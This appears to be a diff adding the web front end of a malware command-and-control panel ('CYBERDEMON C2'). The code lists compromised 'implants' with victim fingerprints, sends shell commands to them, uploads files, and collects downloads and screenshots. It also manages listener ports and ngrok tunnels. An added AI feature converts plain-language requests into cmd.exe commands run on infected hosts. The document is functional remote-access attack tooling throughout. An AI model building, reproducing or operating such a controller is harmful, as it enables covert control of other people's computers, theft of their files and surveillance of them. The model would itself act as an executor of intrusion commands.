+            <span id="tc" style="color:var(--dim);font-size:9px;font-family:'JetBrains Mono',monospace;">no client selected</span>
+          </div>
+          <div class="term" id="to">
+            <div class="emp"><div class="b">&#9000;</div>Select a client from the Clients panel</div>
+          </div>
+          <div class="tr">
+            <input type="text" id="ci" placeholder="Enter command..." disabled>
+            <button id="sb" disabled onclick="send()">EXEC</button>
+          </div>
+          <div style="display:flex;gap:6px;margin-top:8px;">
+            <button class="btn btn-r btn-sm" style="flex:1;" onclick="clearT()">Clear</button>
+            <button class="btn btn-sm btn-c" style="flex:1;" id="ub" disabled onclick="upf()">Upload</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- ======== FILES PANEL ======== -->
+      <div class="content-panel" id="p-files">
+        <div class="cc" style="max-width:900px;">
+          <div class="glow-line"></div>
+          <div class="cc-title"><span class="accent">&#9670;</span> Files</div>
+          <div id="fp">
+            <div class="emp"><div class="b">&#128193;</div>Select a client to view files</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ======== HISTORY PANEL ======== -->
+      <div class="content-panel" id="p-hist">
+        <div class="cc" style="max-width:900px;">
+          <div class="glow-line"></div>
+          <div class="cc-title"><span class="accent">&#9670;</span> Command History</div>
+          <div id="hp">
+            <div class="emp"><div class="b">&#128214;</div>Select a client to view history</div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+</div>
+
+<!-- HEX DECORATION -->
+<div class="hex-deco">
+0x43 0x59 0x42 0x45 0x52<br>
+0x44 0x45 0x4d 0x4f 0x4e<br>
+0x43 0x32 0x20 0x76 0x32<br>
+0x2e 0x30 0x20 0x61 0x63<br>
+0x74 0x69 0x76 0x65
+</div>
+
+<input type="file" id="fileInput" onchange="ufs()" style="display:none;">
+
+<script>
+const _pages=['clients','ai','terminal','files','history'];
+let sel=null,pt={},cp='clients',cc=0;
+
+// splash
+(async()=>{
+  const b=document.getElementById('sbar');
+  for(const ms of [180,220,180,220,180]){
+    await new Promise(r=>setTimeout(r,ms));
+    b.style.width=(parseInt(b.style.width||0)+20)+'%';
+  }
+  await new Promise(r=>setTimeout(r,500));
+  document.getElementById('splash').classList.add('hidden');
+  setTimeout(()=>document.getElementById('splash').style.display='none',600);
+})();
+
+function sw(p,silent){
+  if(_pages.indexOf(p)<0)p='clients';
+  cp=p; const i=_pages.indexOf(p);
+  document.getElementById('panels').style.transform=`translateX(-${i*100}%)`;
+  document.querySelectorAll('.tn').forEach(n=>n.classList.toggle('on',n.dataset.p===p));
+  document.querySelectorAll('.si').forEach(n=>n.classList.toggle('on',n.dataset.p===p));
+  // Each view is its own addressable location, so the five dashboard views
+  // behave like separate pages: refresh keeps the view, and back/forward work.
+  if(!silent&&location.hash.slice(1)!==p)history.pushState({p},'','#'+p);
+  if(p==='files'&&sel)pf(sel);
+  if(p==='history'&&sel)ph(sel);
+}
+window.addEventListener('popstate',e=>{
+  sw((e.state&&e.state.p)||location.hash.slice(1)||'clients',true);
+});
+window.addEventListener('hashchange',()=>{
+  const h=location.hash.slice(1);
+  if(h&&h!==cp)sw(h,true);
+});
+
+async function api(url,opts){try{const r=await fetch(url,opts);return await r.json()}catch{return null}}
+
+// status poll
+setInterval(async()=>{
+  const d=await api('/api/clients');if(!d)return;
+  const e=Object.values(d),on=e.filter(c=>c.connected).length;
+  document.getElementById('hd').className='dot '+(on?'on':'off');
+  document.getElementById('ht').textContent=on?`${on} online`:'Idle';
+},3000);
+
+// clients
+// Show all clients (online + recently disconnected). The registry keeps every
+// client it has ever seen, so an unbounded list of stale rows otherwise buries
+// the one that is actually up. Disconnected clients are shown dimmed.
+//
+// HOST, USER, OS and CPU all come from the implant answering !sysinfo, so
+// they are attacker-controlled as far as this browser is concerned -- a
+// hostile box that answers with markup would otherwise run script in the
+// operator's panel. esc() runs over every value spliced into innerHTML below.
+const esc=s=>String(s==null?'':s)
+  .replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+
+function agoStr(t){
+  if(!t)return '--';
+  const s=Math.max(0,Date.now()/1000-t);
+  if(s<60)return Math.floor(s)+'s';
+  if(s<3600)return Math.floor(s/60)+'m';
+  if(s<86400)return Math.floor(s/3600)+'h';
+  return Math.floor(s/86400)+'d';
+}
+
+function ctitle(c){
+  const i=c.info;
+  if(!i)return c.connected
+    ?'connected, fingerprint pending'
+    :'offline, never fingerprinted';
+  // Filter on the value, not on a split of the rendered line: a payload with
+  // no Uptime line (Windows) yields undefined there, and 'undefined' is a
+  // truthy string that would sail straight through the check.
+  return [['host',i.host],['user',i.user],['os',i.os],['arch',i.arch],
+          ['cpu',i.cpu],['ip',i.ip],['cwd',i.cwd],['up',i.uptime]]
+    .filter(p=>p[1])
+    .map(p=>p[0].padEnd(5)+': '+esc(p[1]))
+    .join('\n');
+}
+
+function cRow(c){
+  const i=c.info||null, on=c.connected;
+  const host=(i&&i.host)||c.ip||c.addr;
+
+  const who=[];
+  if(i){if(i.user)who.push(i.user);if(i.os)who.push(i.os);}
+  const line2=i?(who.map(esc).join(' &middot; ')||'?'):(on?'fingerprinting&hellip;':'no fingerprint');
+
+  const hw=[];
+  if(i){
+    if(i.cores)hw.push(esc(i.cores)+'c');
+    if(i.arch)hw.push(esc(i.arch));
+    if(i.mem_total)hw.push(esc(i.mem_total));
+    if(i.uptime)hw.push('up '+esc(i.uptime));
+  }
+  const line3=esc(c.addr)+' &middot; '+
+    (hw.length?hw.join(' &middot; '):'&mdash;')+' &middot; '+
+    agoStr(c.last_seen)+' &middot; '+esc(c.output_count)+' resp';
+
+  const line4=c.last_cmd
+    ?'<div class="lc" title="'+esc(c.last_cmd.cmd)+'">&gt; '+esc(c.last_cmd.cmd)+
+      '<span class="t">'+esc(c.last_cmd.time||'')+'</span></div>'
+    :'<div class="lc idle">&gt; nothing sent yet</div>';
+
+  return '<div class="ci'+(on?'':' stale')+(sel===c.id?' sel':'')+'"'+
+    ' onclick="sc(\''+esc(c.id)+'\')" title="'+ctitle(c)+'">'+
+    '<span class="dot '+(on?'on':'off')+'"></span>'+
+    '<div class="info">'+
+      '<div class="rt"><span class="host">'+esc(host)+'</span>'+
+        '<span class="bdgs"><span class="bdg p">'+esc(c.proto||'CYB3')+'</span>'+
+        (i&&i.arch?'<span class="bdg a">'+esc(i.arch)+'</span>':'')+
+        '</span></div>'+
+      '<div class="who'+(i?'':' wait')+'">'+line2+'</div>'+
+      '<div class="hw">'+line3+'</div>'+line4+
+    '</div>'+
+    '<button class="pr" title="Re-fingerprint (re-run !sysinfo)"'+
+    ' onclick="event.stopPropagation();cprobe(\''+esc(c.id)+'\')">&#8635;</button>'+
+  '</div>';
+}
+
+let clData={},clQ='',clOnly=false;
+
+function cmatch(c,q){
+  if(!q)return true;
+  const hay=[c.addr,c.ip,c.id,c.proto,
+             c.info?Object.values(c.info).join(' '):'',
+             c.last_cmd?c.last_cmd.cmd:''].join(' ').toLowerCase();
+  return hay.indexOf(q)>=0;
+}
+
+function cRender(){
+  const all=Object.values(clData);
+  const e=all.filter(c=>(!clOnly||c.connected)&&cmatch(c,clQ));
+  // Live implants first, then most recently seen. With a restored roster of
+  // offline rows the operator should never have to hunt for the live one.
+  e.sort((a,b)=>(b.connected?1:0)-(a.connected?1:0)||(b.last_seen||0)-(a.last_seen||0));
+  const l=document.getElementById('cl');
+  if(!all.length){
+    l.innerHTML='<div class="emp"><div class="b">&#9881;</div>No connections</div>';
+  }else if(!e.length){
+    l.innerHTML='<div class="none"><b>&#9906;</b>no implant matches &quot;'+esc(clQ)+'&quot;</div>';
+  }else{
+    l.innerHTML=e.map(cRow).join('');
+  }
+  document.getElementById('cfc').textContent=e.length+'/'+all.length;
+}
+
+function cfilter(){
+  // Read the inputs here, but do not re-render them: only #cl is rewritten,
+  // so the operator's caret and any half-typed query survive the 2.5s poll.
+  clQ=(document.getElementById('cfq').value||'').trim().toLowerCase();
+  clOnly=document.getElementById('cfo').checked;
+  cRender();
+}
+
+function cprobe(id){
+  // The reply lands asynchronously; rc() picks it up on its next poll.
+  api('/api/client/'+encodeURIComponent(id)+'/probe',{method:'POST'});
+}
+
+async function rc(){
+  const d=await api('/api/clients');if(!d)return;clData=d;cRender();
+}
+setInterval(rc,2500);
+setInterval(aiHealth,15000);aiHealth();
+// Restore the view from the URL on load so #ai, #files etc. are shareable.
+sw(location.hash.slice(1)||'clients',true);
+
+function sc(id){
+  sel=id;document.getElementById('tc').textContent=`[ ${id.substring(0,12)}... ]`;
+  document.getElementById('ci').disabled=false;document.getElementById('sb').disabled=false;
+  document.getElementById('ub').disabled=false;
+  document.getElementById('aiIn').disabled=false;document.getElementById('aiGo').disabled=false;
+  document.getElementById('aic').textContent=`[ ${id.substring(0,12)}... ]`;
+  document.getElementById('to').innerHTML='';document.getElementById('to').dataset.count=0;
+  for(const k in pt)clearInterval(pt[k]);pt={};
+  pt.t=setInterval(()=>ptf(id),500);pt.f=setInterval(()=>{if(cp==='files')pf(id);},3000);
+  pt.h=setInterval(()=>{if(cp==='history')ph(id);},5000);
+  // Don't yank the operator off the AI tab they are already using.
+  if(cp==='ai'){document.getElementById('aiIn').focus();}
+  else{document.getElementById('ci').focus();sw('terminal');}
+}
+
+// ---- AI prompt (cybai.py: NL -> cmd.exe, operator approves, then runs) ----
+let aiPending=null;   // {prompt, command}
+let aiBusy=false;     // one model call / one implant run at a time
+
+function aiLog(html){
+  const l=document.getElementById('aiLog');
+  const empty=l.querySelector('.emp');if(empty)empty.remove();
+  l.insertAdjacentHTML('beforeend',html);
+  l.scrollTop=l.scrollHeight;
+}
+const aiEsc=s=>String(s==null?'':s).replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));
+
+function aiHealth(){
+  api('/api/ai/health').then(h=>{
+    const el=document.getElementById('aic');
+    if(!h){el.textContent='unavailable';return;}
+    el.textContent=h.ok?`${h.model} · ${h.version}`:`error: ${h.error}`;
+    el.style.color=h.ok?'var(--dim)':'var(--red)';
+  });
+}
+
+// True while a proposed command is waiting to be confirmed.
+function aiAwaitingConfirm(){
+  return !!aiPending &&
+         document.getElementById('aiApprove').style.display!=='none';
+}
+
+function aiSetBusy(b){
+  aiBusy=b;
+  document.getElementById('aiGo').disabled=b||!sel;
+  document.getElementById('aiGo').textContent=b?'...':'PLAN';
+}
+
+// Enter plans, Enter again confirms and runs, Esc cancels. The confirm step is
+// deliberate: the model is small and has returned a wrong command before, and
+// this is a live box.
+document.getElementById('aiIn').addEventListener('keydown',e=>{
+  if(e.key==='Escape'){if(aiPending)aiCancel();return;}
+  if(e.key!=='Enter'||e.shiftKey)return;
+  e.preventDefault();
+  if(aiBusy)return;
+  if(aiAwaitingConfirm())aiRun();else aiPlan();
+});
+
+async function aiPlan(){
+  const inp=document.getElementById('aiIn');
+  const prompt=inp.value.trim();
+  if(!prompt||aiBusy)return;
+  if(!sel){aiLog('<div class="emp"><div class="b">&#9881;</div>Select a client first</div>');return;}
+  aiPending=null;document.getElementById('aiApprove').style.display='none';
+  aiLog(`<div style="margin:8px 0;"><span style="color:var(--dim)">you:</span> ${aiEsc(prompt)}</div>`);
+  aiLog('<div style="margin:8px 0;color:var(--dim)">planning... <span style="opacity:.6">(Enter again to run the command it proposes)</span></div>');
+  aiSetBusy(true);
+  let r;
+  try{
+    r=await api('/api/ai/plan',{method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({client_id:sel,prompt})});
+  }finally{aiSetBusy(false);}
+  if(!r||r.error){
+    aiLog(`<div style="margin:8px 0;color:var(--red)">plan failed: ${aiEsc(r&&r.error||'no response')}</div>`);return;
+  }
+  aiPending={prompt,command:r.command};
+  document.getElementById('aiCmd').textContent=r.command;
+  document.getElementById('aiApprove').style.display='block';
+  document.getElementById('aiIn').focus();
+}
+
+function aiCancel(){
+  aiPending=null;
+  document.getElementById('aiApprove').style.display='none';
+  aiLog('<div style="margin:8px 0;color:var(--dim)">cancelled</div>');
+  document.getElementById('aiIn').focus();
+}
+
+async function aiRun(){
+  if(!aiPending||!sel||aiBusy)return;
+  const {prompt,command}=aiPending;
+  aiPending=null;
+  document.getElementById('aiApprove').style.display='none';
+  aiLog(`<div style="margin:8px 0;"><code style="color:var(--green)">$ ${aiEsc(command)}</code></div>`);
+  aiLog('<div style="margin:8px 0;color:var(--dim)">running...</div>');
+  aiSetBusy(true);
+  let r;
+  try{
+    r=await api('/api/ai/run',{method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({client_id:sel,prompt,command})});
+  }finally{aiSetBusy(false);}
+  if(!r||r.error){
+    aiLog(`<div style="margin:8px 0;color:var(--red)">run failed: ${aiEsc(r&&r.error||'no response')}</div>`);return;
+  }
+  // Show any self-correction the model applied, so it is never silent.
+  (r.steps||[]).slice(1).forEach(s=>{
+    aiLog(`<div style="margin:4px 0"><code style="color:var(--yellow)">$ ${aiEsc(s.command)}</code>
+           <span style="color:var(--dim)">(self-corrected)</span></div>`);
+  });
+  aiLog(`<div style="margin:4px 0;padding:6px 8px;background:rgba(0,0,0,.35);border-radius:4px;
+        white-space:pre-wrap;font-family:'JetBrains Mono',monospace;font-size:11px;">${aiEsc(r.output||'(no output)')}</div>`);
+  aiLog(`<div style="margin:8px 0 14px 0;color:var(--cyan)">${aiEsc(r.answer||'')}</div>`);
+  document.getElementById('aiIn').value='';
+  document.getElementById('aiIn').focus();
+}
+
+
+// terminal
+async function ptf(id){
+  const o=document.getElementById('to');
+  const d=await api(`/api/poll/${id}?since=${o.dataset.count||0}`);
+  if(!d)return;o.dataset.count=d.count;
+  for(const i of d.output){
+    const div=document.createElement('div');
+    div.className='l '+(i.type==='command'?'c':i.type==='system'?'s':'r');
+    div.textContent=i.data;o.appendChild(div);
+    if(i.type==='command')cc++;
+  }
+  if(d.files)for(const f of d.files){
+    const div=document.createElement('div');
+    div.className='l s';div.innerHTML=`[${f.type}] ${f.file}`;
+    o.appendChild(div);
+  }
+  if(!d.connected&&id===sel){const div=document.createElement('div');div.className='l e';div.textContent='[-] Disconnected';o.appendChild(div);}
+  o.scrollTop=o.scrollHeight;
+}
+async function send(){
+  const i=document.getElementById('ci'),c=i.value.trim();
+  if(!c||!sel)return;i.value='';
+  await api('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({client_id:sel,command:c})});
+}
+document.getElementById('ci').addEventListener('keydown',e=>{if(e.key==='Enter')send();});
+function clearT(){const o=document.getElementById('to');o.innerHTML='';o.dataset.count=0;if(sel)api('/api/clear/'+sel,{method:'POST'});}
+
+// upload
+function upf(){if(sel)document.getElementById('fileInput').click();}
+async function ufs(){
+  const fi=document.getElementById('fileInput'),f=fi.files[0];if(!f)return;
+  const r=prompt('Remote path:',f.name);if(!r)return;
+  const fd=new FormData();fd.append('file',f);fd.append('client_id',sel);fd.append('remote_path',r);
+  fi.value='';const d=await api('/api/upload/file',{method:'POST',body:fd});
+  if(d&&d.error)alert('Upload failed: '+d.error);
+  else if(d&&d.sent)alert('Sent: '+d.file+' ('+d.size+' bytes) to '+d.remote);
+}
+
+// files
+async function pf(id){
+  const d=await api(`/api/client/${id}/files`);if(!d)return;
+  const p=document.getElementById('fp');
+  const cats=['downloads','screenshots','uploads'],labels={downloads:'Downloads',screenshots:'Screenshots',uploads:'Uploads'},icons={downloads:'&#8681;',screenshots:'&#128247;',uploads:'&#128228;'};
+  let html='';
+  for(const cat of cats){
+    const items=d[cat]||[];
+    html+=`<div class="fg"><h4>${icons[cat]} ${labels[cat]} <span>(${items.length})</span></h4><div class="file-grid">`;
+    if(!items.length)html+='<div style="color:var(--dim);font-size:10px;padding:4px;">No files</div>';
+    else for(const f of items){
+      const sz=f.size>1048576?(f.size/1048576).toFixed(1)+'MB':f.size>1024?(f.size/1024).toFixed(1)+'KB':f.size+'B';
+      html+=`<div class="fi"><div class="fn">${f.name}</div><div class="fs">${sz}</div><a href="/files/${f.path}" target="_blank">DL</a></div>`;
+    }
+    html+=`</div></div>`;
+  }
+  p.innerHTML=html;
+}
+
+// history
+async function ph(id){
+  const d=await api(`/api/client/${id}/history`);if(!d)return;
+  const p=document.getElementById('hp');
+  if(!d.length){p.innerHTML='<div class="emp"><div class="b">&#128214;</div>No commands</div>';return;}
+  p.innerHTML=d.slice().reverse().map(h=>`<div class="hi"><span class="t">${h.time}</span><span class="c">${h.cmd}</span></div>`).join('');
+}
+
+// listeners
+setInterval(async()=>{
+  const d=await api('/api/listeners');if(!d)return;
+  const l=document.getElementById('ll');
+  if(!d.length){l.innerHTML='<div style="padding:6px;color:var(--dim);font-size:9px;">No listeners configured</div>';return;}
+  l.innerHTML=d.map(x=>{
+    const st=x.running?'on':'off';
+    return `<div class="li"><span class="dot ${st}"></span><span class="pn">Port ${x.port}</span><button class="btn btn-sm" style="padding:3px 8px;font-size:8px;" onclick="tl(${x.port})">${x.enabled?'OFF':'ON'}</button><button class="btn btn-sm" style="padding:3px 8px;font-size:8px;border-color:rgba(255,0,64,0.3);color:var(--red);background:rgba(255,0,64,0.05);" onclick="rl(${x.port})">X</button></div>`;
+  }).join('');
+},3000);
+
+async function addL(){const i=document.getElementById('np'),p=parseInt(i.value);if(!p||p<1||p>65535)return;i.value='';await api('/api/listeners/add',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({port:p})});}
+async function tl(p){await api(`/api/listeners/${p}/toggle`,{method:'POST'});}
+async function rl(p){if(!confirm(`Remove port ${p}?`))return;await api(`/api/listeners/${p}`,{method:'DELETE'});}
+
+// ngrok
+let ngPoll=null;
+async function ngStart(){
+  const port=parseInt(document.getElementById('ngPort').value)||7777;
+  const d=await api('/api/ngrok/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({port})});
+  if(d&&d.error){document.getElementById('ngStatus').textContent='Error: '+d.error;return;}
+  document.getElementById('ngStatus').textContent='Starting...';
+  document.getElementById('ngBtn').style.display='none';document.getElementById('ngStopBtn').style.display='inline';
+  ngPoll=setInterval(ngStatus,2000);ngStatus();
+}
+async function ngStop(){
+  await api('/api/ngrok/stop',{method:'POST'});
+  if(ngPoll){clearInterval(ngPoll);ngPoll=null;}
+  document.getElementById('ngStatus').textContent='Not running';
+  document.getElementById('ngUrl').style.display='none';
+  document.getElementById('ngBtn').style.display='inline';document.getElementById('ngStopBtn').style.display='none';
+}
+async function ngStatus(){
+  const d=await api('/api/ngrok/status');if(!d)return;
+  if(d.running&&d.host){
+    document.getElementById('ngStatus').textContent='Running';
+    document.getElementById('ngUrl').style.display='block';
+    document.getElementById('ngUrl').textContent=d.tunnel;
+    if(ngPoll){clearInterval(ngPoll);ngPoll=null;}
+  }else if(d.running){
+    document.getElementById('ngStatus').textContent='Connecting...';
+  }else{
+    if(document.getElementById('ngBtn').style.display==='none')ngStop();
+  }
+}
+setInterval(async()=>{
+  const d=await api('/api/ngrok/status');
+  if(d&&d.running&&d.host){document.getElementById('ngStatus').textContent='Running';document.getElementById('ngUrl').style.display='block';document.getElementById('ngUrl').textContent=d.tunnel;}
+},10000);
+
+// bg + logo
+async function loadAssets(){
+  const d=await api('/api/settings');if(!d)return;
+  if(d.bg){document.body.style.backgroundImage=`url(${d.bg}?t=${Date.now()})`;document.body.style.backgroundSize='cover';document.body.style.backgroundPosition='center';document.body.style.backgroundAttachment='fixed';document.body.classList.add('has-bg');}
+  if(d.logo){const html=`<img src="${d.logo}?t=${Date.now()}" alt="logo">`;document.getElementById('splashLogoEl').innerHTML=html;document.getElementById('hdrLogoEl').innerHTML=html;}
+}
+loadAssets();
+
+rc();
+</script>
+</body>
+</html>
